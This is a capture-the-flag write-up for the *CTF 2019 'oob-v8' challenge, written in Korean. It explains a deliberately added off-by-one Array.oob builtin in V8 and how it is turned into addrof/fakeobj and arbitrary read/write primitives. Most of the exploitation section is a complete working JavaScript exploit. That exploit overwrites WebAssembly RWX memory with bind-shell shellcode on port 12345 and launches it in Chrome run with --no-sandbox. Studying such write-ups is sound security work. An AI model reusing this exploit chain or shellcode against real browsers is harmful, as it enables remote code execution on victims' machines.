# [*CTF 2019 / pwnable] oob-v8

> Yet another off by one
>
> $ nc 212.64.104.189 10000
> 
> the v8 commits is 6dc88c191f5ecc5389dc26efa3ca0907faef3598.

## Setup

![image](https://github.com/user-attachments/assets/4dc680bf-48d8-4830-80fd-6f6dba0361cd)

```bash
# install depot_tools
cd
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
echo 'export PATH=$HOME/depot_tools:$PATH' >> ~/.zshrc
source ~/.zshrc

# get code
cd
mkdir v8
cd v8
fetch v8
cd v8
git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598
git apply oob.diff
gclient sync -D

# install build dependencies
./build/install-build-deps.sh --unsupported # check build dependencies
sudo apt install -y gcc-arm-linux-gnueabihf g++-9-arm-linux-gnueabihf
sudo apt install -y libasound2:i386 libcap2:i386 libelf-dev:i386 libfontconfig1:i386 libglib2.0-0:i386 libgpm2:i386 libncurses5:i386 libnss3:i386 libpango1.0-0:i386 libpci3:i386 libssl-dev:i386 libssl1.1:i386 libtinfo-dev:i386 libudev1:i386 libuuid1:i386 libx11-xcb1:i386 libxcomposite1:i386 libxcursor1:i386 libxdamage1:i386 libxi6:i386 libxrandr2:i386 libxss1:i386 libxtst6:i386 linux-libc-dev:i386 ant apache2-bin autoconf binutils binutils-aarch64-linux-gnu binutils-arm-linux-gnueabihf binutils-mips64el-linux-gnuabi64 binutils-mipsel-linux-gnu bison bzip2 cdbs cmake curl dbus-x11 devscripts dpkg-dev elfutils fakeroot flex g++ g++-9-multilib g++-arm-linux-gnueabihf g++-mingw-w64-i686 gawk git-core git-svn gperf intltool lib32gcc1 lib32ncurses5-dev lib32stdc++6 lib32z1-dev libappindicator3-1 libappindicator3-dev libasound2 libasound2-dev libatk1.0-0 libatspi2.0-0 libatspi2.0-dev libbluetooth-dev libbrlapi-dev libbz2-1.0 libbz2-dev libc6 libc6-dev libc6-dev-armhf-cross libc6-i386 libcairo2 libcairo2-dev libcap-dev libcap2 libcups2 libcups2-dev libcurl4-gnutls-dev libdrm-dev libelf-dev libexpat1 libffi-dev libfontconfig1 libfreetype6 libgbm-dev libglib2.0-0 libglib2.0-dev libglu1-mesa-dev libgtk-3-0 libgtk-3-dev libjpeg-dev libkrb5-dev libnspr4 libnspr4-dev libnss3 libnss3-dev libpam0g libpam0g-dev libpango1.0-0 libpci-dev libpci3 libpcre3 libpixman-1-0 libpng16-16 libpulse-dev libpulse0 libsctp-dev libspeechd-dev libspeechd2 libsqlite3-0 libsqlite3-dev libssl-dev libstdc++6 libtinfo-dev libtool libudev-dev libudev1 libuuid1 libwayland-egl1-mesa libwww-perl libx11-6 libx11-xcb1 libxau6 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxdmcp6 libxext6 libxfixes3 libxi6 libxinerama1 libxkbcommon-dev libxrandr2 libxrender1 libxslt1-dev libxss-dev libxt-dev libxtst-dev libxtst6 linux-libc-dev-armhf-cross locales openbox p7zip patch perl pkg-config python python-crypto python-dev python-numpy python-openssl python-psutil python-yaml rpm ruby subversion texinfo uuid-dev wdiff x11-utils xcompmgr xsltproc xutils-dev xvfb xz-utils zip zlib1g # install build dependencies manually
sudo apt install -y ninja-build

# debug build
gn gen out/debug --args='is_component_build=false v8_no_inline=true v8_optimized_debug=false'
autoninja -C out/debug d8

# release bulid
gn gen out/release --args='is_debug=false'
autoninja -C out/release d8
```

## Analysis

### oob.diff

```diff
diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
index b027d36..ef1002f 100644
--- a/src/bootstrapper.cc
+++ b/src/bootstrapper.cc
@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",
...
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 0447230..f113a81 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -368,6 +368,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayOob)                                                                \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index ed1e4a5..c199e3a 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtins::kArrayOob:
+      return Type::Receiver();
 
     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
```

`oob.diff`는 `Array` 클래스에 `oob`라는 이름의 새로운 built-in 함수를 추가한다.

```c++
/* src/builtins/builtins-array.cc */

BUILTIN(ArrayOob){
    uint32_t len = args.length();
    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
    Handle<JSReceiver> receiver;
    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
            isolate, receiver, Object::ToObject(isolate, args.receiver()));
    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
    uint32_t length = static_cast<uint32_t>(array->length()->Number());
    if(len == 1){
        //read
        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
    }else{
        //write
        Handle<Object> value;
        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
        elements.set(length,value->Number());
        return ReadOnlyRoots(isolate).undefined_value();
    }
}
```

`len`(argument의 개수)이 1인 경우 array로부터 `length` 위치에 있는 값을 읽어서 반환하고, `len`이 2인 경우 그 위치에 인자로 전달된 값을 쓴다. 즉 한 칸만큼의 OOB read/write가 가능하다.

![image](https://github.com/user-attachments/assets/eb6c0bb6-96c1-46f1-aa29-e8d10cde80ca)

![image](https://github.com/user-attachments/assets/21c5a976-0a64-461c-803b-6bca81cb68ba)

## Exploitation

### Addrof / fakeobj

OOB를 이용하여 임의의 array에서 elements의 바로 뒤쪽에 위치한 자기 자신의 map을 읽거나 덮어쓸 수 있다.

![image](https://github.com/user-attachments/assets/9c73e077-e94c-47ee-bb1b-9f663e92cdcc)

![image](https://github.com/user-attachments/assets/bcff069a-01ef-4a01-9bbd-a12bc32e01d0)

Object array의 map을 float array의 map으로 덮어쓰면 object array에 저장된 object를 읽어올때 float 형태로 가져오게 된다. 이 원리로 임의의 object의 주소를 구하는 `addrof` primitive를 구현할 수 있다. 반대로, object array에 float을 저장하고 다시 원래의 map을 복구하면 그 float이 object의 주소가 된다. 이 원리로 임의의 주소에 fake object를 생성하는 `fakeobj` primitive를 구현할 수 있다.

### AAR / AAW

Float array의 구조를 만들고 그 위치에 fake object를 생성하면 elements 포인터를 임의의 주소로 설정하여 그 주소에 저장된 8바이트 값을 읽고 쓸 수 있다.

8바이트 AAW를 이용하여 `ArrayBuffer`의 backing store를 임의의 주소로 덮어쓰면 그 주소에 `ArrayBuffer`의 크기만큼 임의의 값을 쓸 수 있다.

![image](https://github.com/user-attachments/assets/0e7fd867-3122-47c4-9cee-e3022208f9d9)

![image](https://github.com/user-attachments/assets/73871fe3-6e7d-444d-b196-8b0d3a46e78d)

### Execute shellcode

WebAssembly instance를 생성하면 WebAssembly code를 실행하기 위해 RWX 권한을 가진 메모리가 할당된다.

![image](https://github.com/user-attachments/assets/ecdb3567-0670-4c01-998c-fc2d9c6a57da)

![image](https://github.com/user-attachments/assets/8be0dc12-7338-43b8-81a8-a226e8372ce1)

이 영역에 저장된 코드를 shellcode로 덮어쓰고 WebAssembly instance의 exported function을 실행하면 shellcode를 실행할 수 있다.

### Full code

`ex.js`:

```js
let fi_buf = new ArrayBuffer(8);
let f_buf = new Float64Array(fi_buf);
let i_buf = new BigUint64Array(fi_buf);

/* convert bigint to float */
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

/* convert float to bigint */
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

/* convert bigint to hex string */
function hex(i) {
    return '0x' + i.toString(16)
}


let float_arr;
let obj_arr;
let float_arr_map;
let obj_arr_map;

(function trigger() {
    float_arr = [1.1];
    let tmp_obj = {};
    obj_arr = [tmp_obj];

    float_arr_map = ftoi(float_arr.oob());
    obj_arr_map = ftoi(obj_arr.oob());
    // console.log(`[+] Map of float array: ${hex(float_arr_map)}`);
    // console.log(`[+] Map of object array: ${hex(obj_arr_map)}`);
})();


/* get address of |obj| */
function addrof(obj) {
    obj_arr[0] = obj;
    obj_arr.oob(itof(float_arr_map)); // overwrite map of |obj_arr| with map of |float_arr|
    let addr = ftoi(obj_arr[0]);
    obj_arr.oob(itof(obj_arr_map)); // restore map of |obj_arr|
    return addr;
}

/* generate fake object at |addr| */
function fakeobj(addr) {
    obj_arr.oob(itof(float_arr_map)); // overwrite map of |obj_arr| with map of |float_arr|
    obj_arr[0] = itof(addr);
    obj_arr.oob(itof(obj_arr_map)); // restore map of |obj_arr|
    return obj_arr[0];
}


let fake_arr_struct = [itof(float_arr_map), 2.2, 3.3, itof(1n << 32n)];

/* read 8bytes from |addr| */
function aar(addr) {
    fake_arr_struct[2] = itof(addr - 0x10n);
    let fake_arr = fakeobj(addrof(fake_arr_struct) - 0x20n);
    return ftoi(fake_arr[0]);
}

/* write 8bytes |value| to |addr| */
function aaw(addr, value) {
    fake_arr_struct[2] = itof(addr - 0x10n);
    let fake_arr = fakeobj(addrof(fake_arr_struct) - 0x20n);
    fake_arr[0] = itof(value);
}


/* get rwx region */

let instance = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x4, 0x1, 0x2, 0x0, 0xb]))); // (module (func (export "main")))
let rwx = aar(addrof(instance) + 0x88n);
// console.log(`[+] Address of RWX region: ${hex(rwx)}`);


/* execute shellcode */

let shellcode = [0x6a, 0x29, 0x58, 0x6a, 0x2, 0x5f, 0x6a, 0x1, 0x5e, 0x99, 0xf, 0x5, 0x52, 0xba, 0x1, 0x1, 0x1, 0x1, 0x81, 0xf2, 0x3, 0x1, 0x31, 0x38, 0x52, 0x6a, 0x10, 0x5a, 0x48, 0x89, 0xc5, 0x48, 0x89, 0xc7, 0x6a, 0x31, 0x58, 0x48, 0x89, 0xe6, 0xf, 0x5, 0x6a, 0x32, 0x58, 0x48, 0x89, 0xef, 0x6a, 0x1, 0x5e, 0xf, 0x5, 0x6a, 0x2b, 0x58, 0x48, 0x89, 0xef, 0x31, 0xf6, 0x99, 0xf, 0x5, 0x48, 0x89, 0xc7, 0x6a, 0x2, 0x5e, 0x6a, 0x21, 0x58, 0xf, 0x5, 0x48, 0xff, 0xce, 0x79, 0xf6, 0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x1, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1, 0x1, 0x31, 0xf6, 0x56, 0x6a, 0x8, 0x5e, 0x48, 0x1, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0xf, 0x5]; // pwn.shellcraft.bindsh(12345)

let buf = new ArrayBuffer(shellcode.length);
aaw(addrof(buf) + 0x20n, rwx); // overwrite backing store of |buf| with address of rwx region

let view = new DataView(buf);
for (let i = 0; i < shellcode.length; i++) {
    view.setUint8(i, shellcode[i]); // write shellcode to rwx region
}

instance.exports.main(); // call exported main() => execute shellcode
```

`ex.html`:

```html
<!DOCTYPE html>
<html>

<head></head>

<body>
    <script src="ex.js"></script>
</body>

</html>
```

Terminal 1:

```bash
./attachment/Release/chrome --no-sandbox ex.html
```

Terminal 2:

![image](https://github.com/user-attachments/assets/d626efe9-84ce-4d7d-955c-9903c14d9611)
